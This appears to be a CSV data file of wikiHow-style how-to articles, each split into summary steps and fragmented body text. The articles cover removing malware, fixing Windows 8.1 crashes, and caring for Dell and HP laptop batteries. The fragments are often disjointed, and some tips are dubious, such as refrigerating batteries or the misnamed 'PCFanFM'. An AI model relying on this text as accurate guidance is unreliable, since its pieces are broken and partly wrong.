headline,title,text
"
Back up your important files.,
Download an anti-malware program.,
Scan with the anti-malware program.,
Check to see if the problem has been fixed.",How to Fix a Malware Infection on Your Computer1," If you have a particularly stubborn infection on your computer, it may become impossible to solve the infection without reinstalling your operating system. Sometimes, using anti-malware programs may also damage your computer.


Copy your files to a USB flash drive.
If you have access to an online file backup service, use that.;
, There are many free options available, such as Malwarebytes Antimalware or SuperAntiSpyware. Some anti-malware programs allow on-demand free trials, and are therefore also usable for removing malware.


If you already have an anti-malware program installed, then update the virus definitions. Anti-malware definitions need to be kept up-to-date in order for the anti-malware programs to remove viruses.
If a virus prevents you from downloading or running an anti-malware program, run the program in Safe Mode with Networking by tapping F8 repeatedly when your computer is starting up, and selecting ""Safe Mode with Networking"". This works because only operating system core files start up in Safe Mode.
If running the anti-malware program in Safe Mode also does not work, you can use Malwarebytes Chameleon or Rkill to kill malware processes which may be preventing you from running an anti-malware product.

, Quarantine or clean any infections that are found.


Be sure to turn on ""Scan for Potentially Unwanted Programs"" in the program's settings. Some programs may have legitimate uses, but can also be used by hackers for malicious reasons; this is why they are considered potentially unwanted. Potentially unwanted programs include keyloggers and adware, which may have legitimate uses.
Update your virus definitions before scanning.

, If it is not, then install a different program and see if it becomes fixed. If no programs can fix your problem, then you may want to consider reinstalling your computer. Note that there still may be malware left on your computer even if the malware problem appears to be fixed. Use a different anti-malware application, just to make sure.

"
"
Press Windows Key + C simultaneously.,
The Charms Bar will appear.,
Type ""View installed updates"" in the Search Box.

,
Click the Settings icon.

,
Open that from the Search Results.

,
Sort the updates in date-wise manner.,
Uninstall any recently installed updates.",How to Fix Windows 8.1 Crashes1,";
, Click the Search icon.

,,,, Click the ""Installed on"" column.

, To do so, right click an update and select Uninstall option.

"
"
Back up your important files.,
Burn a bootable rescue disk onto a CD, and insert it into your computer's CD drive.,
Scan for the malware.",How to Fix a Malware Infection on Your Computer2," You can do this by changing your BIOS settings to allow booting from removable media. Then, you burn Lubuntu, a version of Linux, onto a CD. Insert the Lubuntu Live CD into your computer's CD drive, and restart. You will boot into Lubuntu. Then, you should use the file manager program included with Lubuntu, PCFanFM, to copy your files onto a flash drive.

, Bootable rescue disks are provided for free by major anti-malware software vendors, as long as you have spare CDs with you.

, The rescue disk should include tools to scan your computer for malware which may be preventing your computer from starting up.

"
"
Go to Settings.

,
Go to Change PC Settings.

,
Go to Update and Recovery.

,
Open Recovery, and click ""Get started"" under ""Refresh your PC without affecting your files"".",How to Fix Windows 8.1 Crashes2,",,,


You can also get to refresh your PC through search: Press Windows Key + X and select Search. Type ""Refresh your PC"" in the Search Box. Click the Settings icon. Open that from the Search Results, and follow the on-screen instructions.

"
"
Press Windows Key + X simultaneously.

,
Select Device Manager.

,
Expand the top root entry, i.e.,
Click the View menu, check-up Show hidden devices.

,
Do you see devices with yellow-color exclamation mark?,
After successful uninstallation, restart your computer.

",How to Fix Windows 8.1 Crashes3,",, the computer name.

,, Right click a malfunctioning device and select ""Uninstall"" option to initialize the driver removal.

,"
"
Insert Windows 8.1 Operating System installation disc in your DVD Drive.

,
Press Windows Key + X.

,
Select ""Command Prompt (Admin)"".

,
Type the following command; press ENTER:


sfc /scannow

,
After successful completion, type ""EXIT"" and press ENTER.

",How to Fix Windows 8.1 Crashes4,",,,,"
"
Press Ctrl + Alt + Delete keys simultaneously.

,
Click ""Task Manager"".

,
Click ""More details"" link at the bottom left.

,
Click the Startup tab.

,
Click the ""Status"" column to sort the startup items in a relevant manner.

,
Disable all the Non-Microsoft startup programs.,
Exit Task Manager and reboot the PC for the changes to take effects.

",How to Fix Windows 8.1 Crashes5,",,,,, To do so, right click a startup item, select Disable option.

,"
"
Try to avoid frequent full discharging of the xps m1210 battery.,Avoid heat, heat is the xps m1210 battery enemy, the temperature in a car can easily rise 50F in a single hour, in some cases reaching 140F.,If you plan to place your battery for Dell xps m1210 in storage, be sure to have the charge at 40% and stored in the fridge (not freezer) for maximum battery longevity.,Do not set a metallic object on your Rechargeable Dell xps m1210 battery connect metal or it maybe short circuit terminals.,Do not drop or mutilate your xps m1210 battery, and do not try to disassemble your laptop battery pack.,Take out the Dell xps m1210 battery pack from your machine when it is not being used.",How to Extend Your Li Ion Dell XPS M1210 Laptop Battery Life,"

For Dell battery xps m1210 meter calibration, periodically do a full battery discharge, every 30 charges, to increase meter accuracy.
The Rechargeable Dell xps m1210 undergo self-discharging when left unused for a long time. So it is necessary to recharge the battery after a storage period.;
,,,,,"
"

Don’t run out of your HP 510 battery.,

New laptop batteries generally arrive in a discharged state, so, before you use them first time, you had better charge your HP 510 laptop batteries up for at least four hours.
,

Make sure the vents in your the laptop are not blocked and the laptop does not overheat.,

When carrying the battery.,

Don't use the laptop battery unless you have to!,

If your HP 510 battery will not be in use it should be removed from your laptop and stored in an Anti-Static bag and in a dry, cool place.,

Do not disassemble the HP 510 battery, the contents may be corrosive and harmful for your health.
",How to Extend Life of  Hp 510 Battery," Lithium Ion laptop batteries work best when they are recharged while they still have 10 to 20% capacity remaining. So if you are using your notebook battery on your journey, try not to get in the habit of using the notebook battery until it has almost no charge.
,, Extreme heat causes the increases the self-discharge rate of the battery., Do not short circuit the terminals or store your battery pack with metal objects such as necklaces or hairpins., Li-ion batteries degrade or deteriorate continuously it have a life of about 300-500+ recharge cycles or about one year, the battery will end up with very low capacity and this renders the battery unusable. Many people keep their laptop plugged in all the time, that’s not good., make sure it is has about 40 - 50% charge and it is highly recommended to cycle it at least once a month.,"
"
Take the laptop out of its case.,
Make sure it is off and not in sleep mode.

,
Flip it over onto it's top so you are looking at the bottom.

,
To identify the battery: Newer models have it underneath.,
For the newer ones that have the battery on the bottom, look on the battery for a little white rectangle with 5 lights on it.,
For the older ones, take out the battery and look in the inside, where the connector is.",How to Check the Charge of a Dell Laptop's Battery,";
,,, Look for a gray or black rectangle. Older models may have it at the front, where you put CD drives and such.

, There will be a button next to them. Push it. The lights will come on. The number of lights will give you an estimation on how much it has left.5-Full. 4-80%. 3-60%. 2-40%. 1-20%. None-0%. If it is a half, the lights will stay on and the last one will blink. 4+1=90%. 3+1=70%. 2+1=50%. 1+1 =30%.

, There should be the same as above, a little pad with 5 lights on it. Do that same as above.

"
